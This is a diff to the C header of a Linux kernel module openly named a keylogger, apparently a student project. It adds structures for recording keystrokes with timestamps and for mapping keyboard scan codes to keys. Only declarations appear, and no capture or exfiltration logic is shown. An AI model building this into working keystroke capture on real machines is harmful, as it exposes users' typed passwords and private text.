@@ -6,13 +6,14 @@
 # include <linux/init.h>
 # include <linux/miscdevice.h>
 # include <linux/fs.h>
-# include <linux/device.h>
 # include <linux/string.h>
-# include <linux/list.h>
 # include <linux/workqueue.h>
 # include <linux/interrupt.h>
 # include <linux/delay.h>
 # include <linux/spinlock.h>
+# include <linux/time.h>
+# include <linux/list.h>
+# include <linux/slab.h>
 # include <asm/io.h>
 
 # define KEYBOARD_IRQ	1
@@ -35,6 +36,9 @@
 # define ERROR		-1
 # define UNDEFINED	1
 
+# define PRESSED	0
+# define RELEASED	1
+
 ssize_t keylogger_read(struct file *filp, char __user *buffer,
 				size_t length, loff_t *offset);
 
@@ -50,11 +54,30 @@ struct transition_table {
 	unsigned int	input;
 	unsigned int	output;
 	int		state;
-}
+};
 
 struct fsm {
 	unsigned int current;
 	unsigned int state;
+};
+
+struct s_stroke {
+	unsigned char	key;
+	unsigned char	state;
+	char		name[25];
+	struct	tm	tm;
+	struct s_stroke	*next;
+};
+
+struct scan_to_key {
+	unsigned int 	st_code;
+	unsigned int 	nd_code;
+	char		key;
+};	
+
+struct scan_state {
+	unsigned int	scan_code;
+	char		state;
 }
 
 #endif
